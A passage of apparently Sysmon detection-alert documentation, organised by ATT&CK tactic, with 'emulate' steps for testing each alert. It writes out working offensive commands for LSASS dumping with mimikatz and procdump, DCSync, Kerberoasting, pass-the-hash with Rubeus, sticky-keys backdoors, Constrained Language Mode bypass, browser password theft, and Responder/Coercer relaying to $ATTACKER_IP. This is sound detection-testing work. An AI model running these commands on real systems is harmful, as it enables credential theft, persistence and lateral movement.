Then attempt to run an .exe file via command prompt from folder C:\Users\\$AUTHENTICATED_USER\Downloads folder (where $AUTHENTICATED_USER is a normal user's authenticated user ID)

When file execution is blocked the following error message is displayed "This program is blocked by group policy"

sysmon_detect_malicious_file_av
Alert to detect that malware was detected by Windows Defender AV

Alert pre-requisite: Windows Defender being installed on System Event ID 1116

Emulate via UI/EICAR

Deploy an EICAR file to the local disk as text.exe file via an editor from the following link: https://secure.eicar.org/eicar.com.txt and validate that Windows AV defender is still running

Reference: https://bhabeshraj.com/post/tampering-with-microsoft-defenders-tamper-protection/

Command and Scripting Interpreter
Powershell
sysmon_detect_powershell_clm_bypass_powershell_version
Alert to detect Constrained Language Mode (CLM) Bypass via Powershell version 2.0

Reference: https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass

Emulate via powershell

powershell -version 2
sysmon_detect_powershell_clm_bypass_invoke_wmimethod
Alert to detect Constrained Language Mode (CLM) Bypass via Powershell version 2.0 invoked via WMI in powershell

Reference: https://sp00ks-git.github.io/posts/CLM-Bypass/

Emulate via Powershell

$CurrTemp = $env:temp
$CurrTmp = $env:tmp
$TEMPBypassPath = "C:\windows\temp"
$TMPBypassPath = "C:\windows\temp"

Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"

Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "Powershell.exe -Version 2 -ExecutionPolicy bypass"
sleep 5

#Set it back
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp
sysmon_detect_powershell_assembly_invoked_unusual_targets
Alert to detect execution of Powershell Assembly System.Management.Automation from unsual targets without other Powershell utilities referenced

Note: Currently this alert focuses on a very specific set of locations to reduce False Positives (eg \Users and \Temp\ directories) App users should expand on these locations after baselining their individual environment.

Emulate via nimplant C2

There are a number of ways to execute this. One method is to setup nimplant and execute the following command from server once a client is setup:

powershell Get-Process
This can also be emulated via powerpick utility in Cobaltstrike

sysmon_detect_powershell_execution_non_windows_powershell_binaries
Alert to detect execution of Powershell commands from non Windows-Powershell locations (e.g. powershell.exe)

Emulate via nimplant C2

This would be similar to steps discussed in sysmon_detect_powershell_assembly_invoked_unusual_targets. The invocation of powershell would be directly through the process running as agent (and not from powershell.exe as would normally be expected )

TA0003 Persistence
Event Triggered Execution
Accessibility Features
sysmon_detect_sticky_keys_sethc_file_tamper
Alert detects addition of sethc backdoor for persistence.

A new dashboard panel called SHA256 Hash vs Process Image in Windows Security Monitoring Dashboard has also been added to detect executables with hashes being executed from multiple paths

Pre-requisite: Windows Event ID 11 (File Created)

Refer: https://www.nextron-systems.com/2015/03/21/detect-system-file-manipulations-with-sysinternals-sysmon/

Emulate via UI

Change owner of C:\Windows\System32\sethc.exe file from TrustedInstaller to Builtin\Administrator Change permissions of Builtin\Administrator to have 'Full Control' permission Backup the sethc.exe to sethc.exe.bak Launch Command Prompt and copy cmd.exe to sethc.exe

copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

Scheduled Task/Job
Scheduled Task
sysmon_detect_scheduled_task_schtasks
Alert detects creation of a scheduled task via schtasks

Pre-requisite: Sysmon Event ID 1 (Process Create)

Emulate via cmd

Execute the following command:
"C:\Windows\system32\schtasks.exe"  /Create /F /SC DAILY /ST 12:00 /TN TestTask2 /TR "c:\Windows\system32\cmd.exe /c 'whoami > C:\Users\Administrator\Desktop\whoami.txt'
TA0004 Privilege Escalation
Hijack Execution Flow
DLL Search Order Hijacking
sysmon_detect_localpotato_lpe_storsvc
Alert for detection of LocalPotato LPE via StorSvc service (CVE-2023-21746)

*Emulate via blackarrowsec/redteam-research

Refer to the steps in this article

TA0005 Defence Evasion
T1036 Masquerading
T1036.003 Rename System Utilities
sysmon_detect_execution_filename_mismatch
Alert to detect execution of Binaries where Original File Name does not match the image executed

Note: This alert may need to be baselined to exclude specific images or paths from which legitimate images with renamed files normally execute.

References:

https://redcanary.com/blog/black-hat-detecting-the-unknown-and-disclosing-a-new-attack-technique/
https://github.com/pe3zx/crowdstrike-falcon-queries#execution-of-renamed-executables
Emulate via Windows Explorer

Copy a binary e.g. C:\Windows\System32\control.exe to Downloads folder
Rename the binary to test.exe
Run test.exe
T1218 System Binary Proxy Execution
sysmon_detect_binary_proxy_execution_explorer
Alert on use of Lolbin for Security tools bypass via explorer.exe (for arbitrary file download)

Reference: https://answers.microsoft.com/en-us/windows/forum/all/create-desktop-shortcuts-to-websites-with-edge/38bfd50b-c6db-42f6-b423-41a68af30e6b?page=4

Pre-requisite: Sysmon Event Code 1 (Process Creation)

Emulate via cmd

explorer.exe microsoft-edge:https://server/file.exe.txt
Rundll32
sysmon_detect_binary_proxy_execution_rundll32
Alert on use of Lolbin for Security tools bypass via rundll32 pcwutl - Microsoft HTML Viewer (See Lolbas for more details)

Reference: https://lolbas-project.github.io/lolbas/Libraries/Pcwutl/

Emulate via cmd

rundll32.exe pcwutl.dll,LaunchApplication calc.exe
T1562 Impair Defenses
Disable or Modify Tools
sysmon_detect_applocker_policy_modified
Alert to detect modification of the Applocker policy used for application whitelisting

Pre-Requisite: Windows AppLocker Logs - Event ID 8001

Reference: https://askme4tech.com/how-install-and-configure-applocker-improve-application-control-security

Emulate via UI

Control Panel > Services > Application Identity Services > Start Service Local Security Policy > Application Control Rules > Applocker > Executable Rules > Configured Local Security Policy > Application Control Rules > Applocker > Executable Rules > (Right-Click) Create Default Rules
sysmon_detect_windows_defender_av_switched_off
Alert to detect Windows Defender Real-Time Protection or Cloud-Protection Switched off

Pre-requisite: Windows Defender Log Event ID 5007

Emulate via UI

Control Panel > Windows Defender > Windows Defender Settings > Windows Security > Virus and Threat Protection > Manage Settings > Turn-off Real Time Protection > Turn-off Cloud Delievered Protection
T1564 Hide Artifacts
T1564.002 Hidden Users
sysmon_detect_rdp_hijacking_lastloggedon_user_hide_attempt
Attempt to hide the last logged on user via RDP in Windows

Reference: https://blog.menasec.net/2019/02/of-rdp-hijacking-part1-remote-desktop.html

Emulate via UI

Change the value of the registry key in LoggedOnUser and LoggedOnSAMUser in HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI to a known user e.g. HACKER\Administrator where HACKER is an example short domain name and user is Administrator which we want to show

T1620 Reflective Code Loading
sysmon_detect_dotnet_assembly_execution_unusual_locations
Alert to detect execution of C# .NET assembly from unusual locations"

Reference: https://redhead0ntherun.medium.com/detecting-net-c-injection-execute-assembly-1894dbb04ff7

Note: App users should baseline and can tune this alert for their environment to ignore triggers seen within their environment. This could done in these lines of the alert within the app

...
```Ignore process and parent process image paths that are known to execute .net legitimate binaries. Note: Users should expand this block to exclude more paths for their environments```
| where !(
    like(Image, "C:\Windows\Microsoft.NET\%") OR 
    like(Image, "C:\Windows\System32\%") OR 
    like(ParentImage, "C:\Windows\System32\services.exe")
)
...
Emulate via Watson.exe

There are many ways to execute this alert including via various C2's execute-assembly commands such as Cobaltstrike and NimPlant - it can be done by executing a .NET binary e.g. Watson.exe available here. This will generate image load events (if capturing of Sysmon Event ID 7 is enabled) for clr.dll and clrjit.dll which should trigger this alert.

Watson.exe
TA0006 Credential Access
Steal or forge Kerberos tickets
Kerberoasting
sysmon_detect_kerberoasting_4769
Alert to detect Kerberoasting

Reference: https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/

Emulate via powershell / Powersploit

Invoke-Kerberoast -Domain dev.testlab.local
OS Credential Dumping
sysmon_detect_shadow_credentials_creation
Alert to detect Creation of Shadow Credentials / msds-KeyCredentialLink Key in AD

Reference: https://www.elastic.co/guide/en/security/7.17/prebuilt-rule-0-16-1-potential-shadow-credentials-added-to-ad-object.html

For this, additional Additional Monitoring can be added as follows via Set-AuditRule

Import-Module .\ActiveDirectory
Set-AuditRule -AdObjectPath 'AD:\CN=Computers,DC=hacker,DC=lab' -WellKnownSidType WorldSid -Rights WriteProperty -InheritanceFlags Children -AttributeGUID 5b47d60f-6090-40b2-9f37-2a4de88f3063 -AuditFlags Success
Emulate via pywhisker

python3 pywhisker.py -d $DOMAIN -u $USERNAME -p $PASSWORD --target $COMPUTER_NAME$ --action add --filename test1 --dc-ip $DC_IP
LSASS Memory
sysmon_detect_lsass_memory_access_mimikatz
Alert to detect LSASS Access possibly indicative of Mimikatz

Emulate via cmd/mimikatz

mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"
sysmon_detect_lsass_memory_access_mimikatz
Alert to detect credentials dumping via sysInternals' procdump tool detected via the specific command line arguments used

Emulate via cmd/procdump

procdump.exe -accepteula -ma lsass.exe lsass.dmp
sysmon_detect_lsass_memory_createremotethread
Alert to detect CreateRemoteThread call on lsass.exe

Reference: https://github.com/deepinstinct/LsassSilentProcessExit

Emulate via cmd/LsassSilentProcessExit.exe

LsassSilentProcessExit.exe <PID of LSASS.exe> 1
sysmon_detect_lsass_memory_dumps_temp_folder
Alert to detect dump files being created into the temporary (%TEMP%) folder which is a common place for threat actors to dump memory info

Emulate via cmd

procdump.exe -accepteula -ma lsass.exe /tmp/tlsass.dmp
sysmon_detect_lsass_memory_werfault_rtlreportsilentprocessExit
Alert to detect LSASS memory dump being created via Windows Error Reporting through the RTLReportSilentProcessExit flag

Reference: https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2

Emulate via powershell/PowerLsassSilentProcessExit

# https://github.com/CompassSecurity/PowerLsassSilentProcessExit
.\PowerLsassSilentProcessExit.ps1 -DumpMode 1 -DumpPath C:\Windows\Temp
NTDS
sysmon_detect_credential_dumping_via_ntdsutil
Alert to detect Active Directory Dumping via NTDSUtil

Pre-requisite: Sysmon Event ID 11 (FileCreate)

Reference: https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration

Emulate via cmd

# Execute on a domain controller:
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q" 
DCSync
sysmon_detect_dcsync_execution
Alert to detect DCSync Execution

Pre-requisite: Windows Event Log 4662 (An operation was performed on an object) which must be manually activated - see Alert References

Reference: https://blog.blacklanternsecurity.com/p/detecting-dcsync, https://adsecurity.org/?p=1729

Emulate via cmd/mimikatz

mimikatz “lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt”
sysmon_detect_nopac_computer_account_creation_cve_2021_42278
Alert to detect machine account creation via noPAC tickets (CVE-2021-42287/CVE-2021-42278)

Reference: https://pentestlab.blog/2022/01/10/domain-escalation-samaccountname-spoofing/

Emulate via cmd

Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount "Pentestlab" -Domain "purple.lab" -DomainController "dc.purple.lab"
Cached Domain Credentials
sysmon_detect_networkprovider_registry_set
Alert to detect modification of NetworkProvider Registry keys typically used to capture credentials e.g. NPPSpy

References: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy , https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md#atomic-test-2---credential-dumping-with-nppspy

Copy NPPSPY.dll to C:\Windows\System32 folder and execute the powershell script provided here:  ConfigureRegistrySettings.ps1 

Then sign out and sign in to see the credentials stored in C:\NPPSPY.txt file
Security Account Manager
sysmon_detect_lsass_memory_createremotethread
Alert for detection of use of offensive tools such as gsecdump that create thread into LSASS memory for reading credentials

Pre-requisite: Windows Sysmon Logs - Event ID 8

Download gsecdump.exe from the link in Alert References and run the following command:
     gsecdump.exe -a
Steal or Forge Authentication Certificates
sysmon_detect_ntlm_hashes_extraction_masky
Alert for detection of possible AD Certificate Services Abuse to dump NTLM hashes via Masky

Emulate via crackmapexec (using masky under the hood)

# Edit the /etc/hosts file to include the IP for the DC pointing to the domain
echo "$DC_IP   $DOMAIN" >> /etc/hosts
echo "$DC_IP   $DC_HOSTNAME.$DOMAIN" >> /etc/hosts

# We utilize the latest version of crackmapexec from releases to get ADCS details ($PKI_ENROLMENT_SERVER\PKI_ENROLMENT_CN)
# Normal username can be used for querying PKI info

./cme ldap -u $USER_NAME -p $USER_PASSWORD -M adcs $DC_IP

# We leverage the Local Admin username/password to get the masky agent to run and dump info
date ; ./cme smb -u $USER_NAME -p $USER_PASSWORD -o CA='$PKI_ENROLMENT_SERVER\$PKI_ENROLMENT_CN' -M masky $DC_IP ; date


T1555 Credentials from Password Stores
T1555.003 Credentials from Web Browsers
sysmon_detect_firefox_credentials_read
Alert to detect attempts to read firefox credentials from a non-Firefox process

Pre-requisites

This alert requires the File Auditing to be enabled via secpol.msc > Local Policy > Audit Policy > Audit Object Access (Success/Failure)
Once enabled, the file auditing for Read, Read and Execute and List Contents should be enabled on the folder C:\Users\<Username>\AppData\Roaming\Mozilla\Firefox folder from Everyone for Success and Failure. Option available on right-click > Properties > Security > Advanced > Auditing
Emulate via PasswordFox

Download PasswordFox: https://www.nirsoft.net/utils/passwordfox.html
Extract PasswordFox
Execute Password Fox
sysmon_detect_chrome_credentials_read
Alert to detect attempts to read Google Chrome credentials from a non-Chrome process

Pre-requisites

This alert requires the File Auditing to be enabled via secpol.msc > Local Policy > Audit Policy > Audit Object Access (Success/Failure)
Once enabled, the file auditing for Read, Read and Execute and List Contents should be enabled on the folder C:\Users\<Username>\AppData\Roaming\Chrome\User Data\Default\Login Data folder from Everyone for Success and Failure. Option available on right-click > Properties > Security > Advanced > Auditing
Emulate via ChromePass

Download ChromePass: https://www.nirsoft.net/toolsdownload/chromepass.zip
Extract ChromePass
Execute ChromePass
Brute Force
Password Guessing
sysmon_detect_username_password_bruteforce
Alert for detecting Bruteforcing username and password combination via tools such as kerbrute

Pre-requisite: Windows Event Log - 4768 (Kerberos Pre-Authentication Ticket Requested) Enable Audit Logon Events (Success Failure) in Local Security Policy > Security Settings > Local Policies > Audit Policy

Note: The threshold in this rule must be set as appropriate for the environment (depending on how many failed authentication attempts are typically seen)

Emulate via cmd/kerbrute

# For kerbrute, refer to the link in Alert references to execute attack via kerbrute. Here is a sample command:

/root/go/bin/kerbrute bruteforce --dc $DC_IP -d $DOMAIN /tmp/usernamepassword.txt
sysmon_detect_password_bruteforce
Alert to detect Bruteforcing password for a given username via tools such as kerbrute

Note: The threshold in this rule must be set as appropriate for the environment (depending on how many failed authentication attempts are typically seen)

# Here, username consists of the same value
# For kerbrute, refer to the link in Alert references to execute attack via kerbrute. Here is a sample command:
    /root/go/bin/kerbrute bruteforce --dc $DC_IP -d $DOMAIN /tmp/usernamepassword.txt

TA0007 Discovery
T1087 Account Discovery
sysmon_detect_domain_enumeration_bloodhound
This alert checks if there is an attempt to perform enumeration via bloodhound.py. This has been tested to detect both DCOM and the DEFAULT methods.

Emulate via bloodhound.py

Install and configure bloodhound.py and run the following command to connect to the domain controller and enumerate the domain:

bloodhound-python -dc $DOMAIN -d $DOMAIN -u $DOMAIN_USER -p $DOMAIN_PASSWORD -ns $DC_IP
Network Service Discovery
sysmon_detect_cscript_gathernetworkinfo
Alert for detection LOLBIN gathernetworkinfo.vbs for Information Gathering

Emulate via cmd / cscript

c:\windows\system32\cscript.exe c:\windows\system32\gatherNetworkInfo.vbs
TA0008 Lateral Movement
Remote Services
T1021 Remote Desktop Protocol (RDP)
sysmon_detect_rdp_portnumber_change
Alert to detect RDP Port number changed to avoid firewall blocks

Emulate via UI

Change the value of the PortNumber field in registry key HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp

User Alternate Authentication Material
Pass the Hash
sysmon_detect_overpass_the_hash_rc4
Alert to detect overpass the hash attempts to laterally move in Windows environment

Reference: https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/

Emulate via cli/Reubeus.exe

Rubeus.exe asktgt /domain:igntie.local /user:Administrator /rc4: 32196b56ffe6f45e294117b91a83bf38 /ptt

sysmon_detect_pass_the_hash_rc4
Alert to detect Pass the hash attempts to laterally move in Windows environment

Reference: https://www.cobaltstrike.com/blog/how-to-pass-the-hash-with-mimikatz/

Emulate via mimikatz

# After using the hashdump via mimikatz
mimikatz sekurlsa::pth /user:Administrator /domain:. /ntlm:… /run:"powershell -w hidden"
TA0009 Collection
Adversary-in-the-Middle
LLMNR/NBT-NS Poisoning and SMB Relay
sysmon_detect_excessive_anonymous_network_logon
Alert for detection of Excessive Anonymous Logon Events indicative of coercsion (e.g. via Coercer)

Reference: https://github.com/p0dalirius/Coercer

# Launch Responder as listener on local listener interface (e.g. eth0)
rm /usr/share/responder/Responder.db; responder -I eth0 --analyze

# Clone Coercer repository locally and install necessary deps. Then, Invoke Coercer on target (e.g. DC) to receive the machine account NetNTLM credentials
python3 Coercer.py -d $DOMAIN --listener $ATTACKER_IP --target $TARGET
TA0010 Command and Control
Application Layer Protocol
DNS
sysmon_detect_lolbin_network_connection
Alert to detect network connections from Windows LOLBIN

Note: This alert should be baselined to exclude connections from binaries to domains that are expected in the environment

Emulate via cmd/bitsadmin

bitsadmin /transfer hackingarticles http://www.cnn22.com/ignite.png c:\ignite.png
Ingress Tool Transfer
sysmon_detect_filetransfer_makecab
Alert to detect use of Lolbin makecab.exe for Exfiltration

Reference: https://posts.slayerlabs.com/living-off-the-land/

Emulate via cmd

makecab /d CabinetNameTemplate=enum_results.cab /D DiskDirectoryTemplate=C:\ProgramData /f C:\ProgramData\mca.txt
